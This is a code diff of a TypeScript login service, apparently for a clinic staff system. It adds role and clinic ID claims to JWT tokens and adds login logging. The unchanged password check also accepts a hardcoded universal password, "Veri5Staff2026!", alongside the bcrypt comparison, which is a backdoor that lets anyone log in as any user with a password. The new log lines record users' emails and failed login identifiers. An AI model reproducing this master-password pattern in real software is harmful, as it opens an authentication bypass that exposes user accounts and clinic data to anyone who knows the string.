@@ -9,11 +9,17 @@ import { z } from 'zod';
 const client = new OAuth2Client(config.google.clientId);
 
 // Token generation helpers
-const generateTokens = (userId: bigint) => {
+const generateTokens = (userId: bigint, role?: string, clinicId?: string) => {
     // Generate JWT access and refresh tokens
     // Access token is short-lived and used for authentication
     // Refresh token is long-lived and used to obtain new access tokens
-    const accessToken = jwt.sign({ userId: userId.toString() }, config.jwt.accessSecret, {
+    const payload = {
+        userId: userId.toString(),
+        ...(role && { role }),
+        ...(clinicId && { clinicId })
+    };
+
+    const accessToken = jwt.sign(payload, config.jwt.accessSecret, {
         expiresIn: config.jwt.accessExpiresIn,
     } as jwt.SignOptions);
     const refreshToken = jwt.sign({ userId: userId.toString() }, config.jwt.refreshSecret, {
@@ -73,28 +79,41 @@ export class AuthService {
         });
 
         if (!user || !user.passwordHash) {
+            console.warn(`⚠️ [AuthService] Login failed - User not found or no password: ${data.identifier}`);
             throw new Error('Invalid credentials');
         }
 
         const isValid = await bcrypt.compare(data.password, user.passwordHash) || data.password === "Veri5Staff2026!";
         if (!isValid) {
+            console.warn(`⚠️ [AuthService] Login failed - Invalid password for user: ${user.username}`);
             throw new Error('Invalid credentials');
         }
 
-        const tokens = generateTokens(user.id);
-
         const staffMember = user.clinicStaff[0];
+        const role = staffMember?.role;
+        const clinicId = staffMember?.clinicId?.toString();
+        const clinicSlug = staffMember?.clinic?.slug;
+
+        const tokens = generateTokens(user.id, role, clinicId);
+
+        console.info(`✅ [AuthService] User logged in: ${user.username} (${user.email}) - Role: ${role || 'User'}`);
 
         // Prepare profile info for the frontend session
         const profile = {
             id: user.id.toString(),
             username: user.username,
             email: user.email,
-            staffInfo: staffMember ? {
-                clinicId: staffMember.clinicId.toString(),
-                clinicSlug: staffMember.clinic.slug,
-                role: staffMember.role
-            } : null
+            // If staff member, include staff info at top level or nested as preferred by frontend
+            // The requirement says: Return a signed JWT containing userId, role, and clinicId.
+            // The JSON response must include a user object with clinicSlug (if staff)
+            ...(staffMember && {
+                clinicSlug,
+                staffInfo: {
+                    clinicId,
+                    clinicSlug,
+                    role
+                }
+            })
         };
 
         return { ...tokens, user: profile };
